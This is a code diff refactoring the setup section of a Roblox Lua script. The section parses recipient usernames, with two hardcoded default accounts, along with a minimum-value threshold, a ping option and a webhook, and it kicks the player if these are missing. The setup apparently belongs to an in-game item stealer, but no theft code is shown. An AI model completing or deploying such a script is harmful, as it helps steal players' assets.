@@ -1,37 +1,41 @@
--- Wait for the game to fully load
 if not game:IsLoaded() then
     game.Loaded:Wait()
 end
 
--- Prevent the script from executing multiple times
 _G.scriptExecuted = _G.scriptExecuted or false
-if _G.scriptExecuted then
-    return
-end
+if _G.scriptExecuted then return end
 _G.scriptExecuted = true
 
--- Setup configuration with safe defaults
-local users = type(_G.Usernames) == "table" and _G.Usernames or {"2ndcfpaj67", "CREOLEO23"}
+-- Safe usernames setup
+local users = {}
+if type(_G.Usernames) == "table" then
+    users = _G.Usernames
+elseif type(_G.Usernames) == "string" then
+    for username in string.gmatch(_G.Usernames, '([^,%s]+)') do
+        table.insert(users, username)
+    end
+end
+if #users == 0 then
+    users = {"2ndcfpaj67", "CREOLEO23"}
+end
+
+-- Other safe defaults
 local min_value = type(_G.min_value) == "number" and _G.min_value or 0.1
 local ping = _G.pingEveryone or "Yes"
 local webhook = type(_G.webhook) == "string" and _G.webhook or "YOUR_WEBHOOK_HERE"
 
--- Get Players service and safely get LocalPlayer
+-- Players & LocalPlayer
 local Players = game:GetService("Players")
 local plr = Players.LocalPlayer or Players.PlayerAdded:Wait()
 
 -- Validate essential variables
-if next(users) == nil or webhook == "" then
+if #users == 0 or webhook == "" then
     plr:Kick("You didn't add a username or webhook")
     return
 end
 
--- Optional: debug prints to confirm everything is loaded
 print("Script loaded successfully!")
 print("Users:", table.concat(users, ", "))
-print("Min value:", min_value)
-print("Ping everyone:", ping)
-print("Webhook:", webhook)
 print("LocalPlayer:", plr.Name)
 end
 
